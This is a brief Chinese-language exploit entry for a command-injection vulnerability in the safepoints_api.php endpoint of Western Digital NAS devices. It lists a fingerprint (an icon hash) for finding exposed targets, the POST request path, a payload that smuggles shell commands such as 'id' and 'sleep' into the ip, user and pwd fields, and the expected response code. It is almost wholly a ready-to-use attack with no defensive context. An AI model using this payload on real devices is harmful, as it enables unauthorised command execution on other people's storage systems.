# 西部数据NASsafepoints_api.phpnetwork_get_sharefolder命令执行漏洞

西部数据NASsafepoints_api.phpnetwork_get_sharefo ｜ 命令执行 ｜ —
- **指纹**：`icon_hash="-1074357885"`
- **请求**：`POST /web/addons/safepoints_api.php HTTP/1.1`

**Payload**
```
action=network_get_sharefolder&ip=';id;'&user=';sleep 1;'&pwd=';id;'
```
- **响应特征**：200